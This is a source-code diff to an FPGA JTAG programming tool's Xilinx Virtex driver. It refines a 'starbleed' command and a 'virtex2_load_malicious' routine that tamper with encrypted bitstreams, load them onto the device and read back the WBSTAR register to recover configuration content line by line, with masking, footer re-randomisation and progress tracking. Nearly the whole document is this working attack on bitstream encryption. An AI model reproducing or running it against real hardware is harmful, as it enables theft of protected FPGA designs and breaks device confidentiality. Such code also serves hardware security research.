@@ -20,9 +20,11 @@
 #include "config.h"
 #endif
 
+#include <time.h>
 #include "virtex2.h"
 #include "xilinx_bit.h"
 #include "pld.h"
+#include <sys/random.h>
 
 uint32_t bswap32(const uint32_t input)
 {
@@ -268,19 +270,6 @@ static int virtex2_load_malicious(struct pld_device *pld_device, uint8_t *malici
 	jtag_add_dr_scan(virtex2_info->tap, 1, &field, TAP_DRPAUSE);
 	jtag_execute_queue();
 
-	jtag_add_tlr();
-
-	// if (!(virtex2_info->no_jstart))
-	virtex2_set_instr(virtex2_info->tap, 0xc); /* JSTART */
-	jtag_add_runtest(13, TAP_IDLE);
-	virtex2_set_instr(virtex2_info->tap, 0x3f); /* BYPASS */
-	virtex2_set_instr(virtex2_info->tap, 0x3f); /* BYPASS */
-												// if (!(virtex2_info->no_jstart))
-	virtex2_set_instr(virtex2_info->tap, 0xc);	/* JSTART */
-	jtag_add_runtest(13, TAP_IDLE);
-	virtex2_set_instr(virtex2_info->tap, 0x3f); /* BYPASS */
-	jtag_execute_queue();
-
 	return ERROR_OK;
 }
 
@@ -360,6 +349,13 @@ COMMAND_HANDLER(virtex2_handle_write_wbstar_command)
 	return ERROR_OK;
 }
 
+uint64_t get_timestamp(void)
+{
+	struct timeval tv;
+	gettimeofday(&tv, NULL);
+	return tv.tv_sec * (uint64_t)1000000 + tv.tv_usec;
+}
+
 COMMAND_HANDLER(virtex2_handle_starbleed_command)
 {
 	struct pld_device *device;
@@ -367,6 +363,7 @@ COMMAND_HANDLER(virtex2_handle_starbleed_command)
 
 	struct xilinx_bit_file bit_file, bit_file_mod;
 	int retval;
+	uint64_t cur_time, prev_time = 0, elapsed_time, eta = 0;
 
 	retval = xilinx_read_bit_file(&bit_file, CMD_ARGV[1]);
 	if (retval != ERROR_OK)
@@ -393,83 +390,83 @@ COMMAND_HANDLER(virtex2_handle_starbleed_command)
 		return ERROR_OK;
 	}
 
-	// uint8_t wbstar_write_len;
-	// uint32_t cipher_line_num;
-	// uint32_t rolling_offset_word;
-	// COMMAND_PARSE_NUMBER(u8, CMD_ARGV[2], wbstar_write_len);
-	// COMMAND_PARSE_NUMBER(u32, CMD_ARGV[3], cipher_line_num);
-	// COMMAND_PARSE_NUMBER(u32, CMD_ARGV[4], rolling_offset_word);
-
-	// uint32_t last_plain[4] = {0, 0, 0, 0};
-	// virtex2_generate_malicious(&bit_file, malicious_bitstream, wbstar_write_len, cipher_line_num, last_plain, rolling_offset_word * 4);
-	// for(int i=0; i<MALICIOUS_BITSTREAM_LEN; i++){
-	// 	printf("%02x", malicious_bitstream[i]);
-	// 	if((i+1)%16==0){
-	// 		printf("\n");
-	// 	}
-	// }
-
-	// uint32_t lowbitoffset;
-	// for (lowbitoffset = bit_file.cipher_start + 3; lowbitoffset < 1024; lowbitoffset += 4)
-	// {
-	// 	memcpy(malicious_bitstream, bit_file.data, bit_file.length);
-	// 	malicious_bitstream[lowbitoffset] ^= 0xff;
-	// 	virtex2_load_malicious(device, malicious_bitstream, bit_file.length);
-	// 	jtag_add_sleep(1000);
-	// 	virtex2_read_wbstar(device, &status);
-	// 	command_print(CMD, "virtex2 wbstar register: 0x%8.8" PRIx32 "", status);
-	// 	// sleep(1000);
-	// }
-
-	uint32_t wbstar_reg, bswap32wbstar;
+	uint32_t wbstar_reg, prev_wbstar_reg = 0, bswap32wbstar;
 	uint8_t xored_val;
 	uint32_t rolling_offset, line_num, *fabric_word, total_line_number;
+	// uint32_t mask;
+	uint32_t masks[2] = {0x89abcdef, 0x23456789};
 
 	LOG_INFO("Cipher Position: %d", bit_file_mod.cipher_start);
 	rolling_offset = bit_file_mod.cipher_start + 14 * 4 + 3;
 
 	// for (; position < bit_file.length; position += 1)
 	total_line_number = bit_file.dwc_length * 4 / 16;
+	// total_line_number = 100;
+	// mask = 0x89ABCDEF;
+
 	for (line_num = 1; line_num < total_line_number; line_num++)
 	{
 		uint32_t wbstars[4] = {0, 0, 0, 0};
 		// LOG_INFO("wbstar: %8.8x%8.8x%8.8x%8.8x", wbstars[0], wbstars[1], wbstars[2], wbstars[3]);
+
 		for (xored_val = 0xd; xored_val >= 0xa; xored_val--)
 		{
-			memcpy(malicious_bitstream, bit_file_mod.data, bit_file_mod.length);
-
-			// make random
-			for (uint32_t i = 0; i < 16; i++)
+		TRY_ONE_REG:
+			for (int maskidx = 0; maskidx < 2; maskidx++)
 			{
-				malicious_bitstream[bit_file_mod.cipher_start + 16 * 5 + i] = 0xff;
+				memcpy(malicious_bitstream, bit_file_mod.data, bit_file_mod.length);
+
+				// make random
+				for (uint32_t i = 0; i < 16; i++)
+				{
+					malicious_bitstream[bit_file_mod.cipher_start + 16 * 5 + i] = 0xff;
+				}
+
+				// place fabric
+				for (uint32_t i = 0; i < 32; i++)
+				{
+					malicious_bitstream[bit_file_mod.cipher_start + 16 * 6 + i] = bit_file.data[bit_file.cipher_start + (line_num - 1) * 16 + i];
+				}
+				fabric_word = (uint32_t *)(malicious_bitstream + bit_file.cipher_start + 16 * 6);
+
+				// mask
+				fabric_word[xored_val - 0xa] ^= bswap32(wbstars[xored_val - 0xa] ^ masks[maskidx]);
+
+				//additional delta
+				for (uint32_t i = xored_val + 1; i <= 0xd; i++)
+				{
+					fabric_word[i - 0xa] ^= bswap32(wbstars[i - 0xa] ^ masks[maskidx] ^ 0x20000000);
+				}
+
+				malicious_bitstream[rolling_offset] ^= ((xored_val) ^ 0x1);
+
+				device = get_pld_device_by_num(dev_id);
+				if (!device)
+				{
+					command_print(CMD, "pld device '#%s' is out of bounds", CMD_ARGV[0]);
+					return ERROR_OK;
+				}
+
+				virtex2_load_malicious(device, malicious_bitstream, bit_file_mod.length);
+
+				virtex2_read_wbstar(device, &wbstar_reg);
+				wbstar_reg ^= masks[maskidx];
+				if (maskidx > 0)
+				{
+					if (prev_wbstar_reg != wbstar_reg)
+					{
+						LOG_INFO("Rolling footer");
+						int rd = getrandom(&bit_file_mod.data[bit_file_mod.cipher_start + 8 * 16], bit_file_mod.dwc_length * 4 - 8 * 16, GRND_NONBLOCK);
+						if (rd == -1)
+						{
+							LOG_INFO("Failed to gen random");
+						}
+						goto TRY_ONE_REG;
+					}
+				}
+				prev_wbstar_reg = wbstar_reg;
 			}
 
-			// place fabric
-			for (uint32_t i = 0; i < 32; i++)
-			{
-				malicious_bitstream[bit_file_mod.cipher_start + 16 * 6 + i] = bit_file.data[bit_file.cipher_start + (line_num - 1) * 16 + i];
-			}
-			fabric_word = (uint32_t *)(malicious_bitstream + bit_file.cipher_start + 16 * 6);
-
-			//additional delta
-			for (uint32_t i = xored_val + 1; i <= 0xd; i++)
-			{
-				fabric_word[i - 0xa] ^= bswap32(wbstars[i - 0xa] ^ 0x20000000);
-			}
-
-			// LOG_INFO("Trying rolling_offset: bin[%02x]=%02x, xored with: %02x, line number: %d", rolling_offset, malicious_bitstream[rolling_offset], xored_val, line_num);
-			malicious_bitstream[rolling_offset] ^= (xored_val ^ 0x1);
-
-			device = get_pld_device_by_num(dev_id);
-			if (!device)
-			{
-				command_print(CMD, "pld device '#%s' is out of bounds", CMD_ARGV[0]);
-				return ERROR_OK;
-			}
-
-			virtex2_load_malicious(device, malicious_bitstream, bit_file_mod.length);
-
-			virtex2_read_wbstar(device, &wbstar_reg);
 			wbstars[xored_val - 0xa] = wbstar_reg;
 			if (0)
 			{
@@ -477,12 +474,20 @@ COMMAND_HANDLER(virtex2_handle_starbleed_command)
 				LOG_INFO("wbstar: 0x%8.8" PRIx32 "", wbstar_reg);
 			}
 		}
-		LOG_INFO("progress: %d/%d (%.2f%%), wbstar: %8.8x%8.8x%8.8x%8.8x", line_num, total_line_number, (float)line_num * 100 / (float)total_line_number, wbstars[0], wbstars[1], wbstars[2], wbstars[3]);
+		LOG_INFO("progress: %d/%d (%.2f%%), wbstar: %8.8x%8.8x%8.8x%8.8x, ETA(%.2lfh)", line_num, total_line_number, (float)line_num * 100 / (float)total_line_number, wbstars[0], wbstars[1], wbstars[2], wbstars[3], (double)eta / 1000000 / 3600);
 
 		for (int i = 0; i < 4; i++)
 		{
 			bswap32wbstar = bswap32(wbstars[i]);
 			fwrite(&bswap32wbstar, sizeof(uint32_t), 1, out_file);
+		}
+		if (!(line_num % 50))
+		{
+			cur_time = get_timestamp();
+			elapsed_time = cur_time - prev_time;
+			prev_time = cur_time;
+			eta = (total_line_number - line_num) * elapsed_time / 50;
+			// LOG_INFO("ETA: %lf", (double)eta / 1000000 / 3600);
 		}
 	}
 	fclose(out_file);
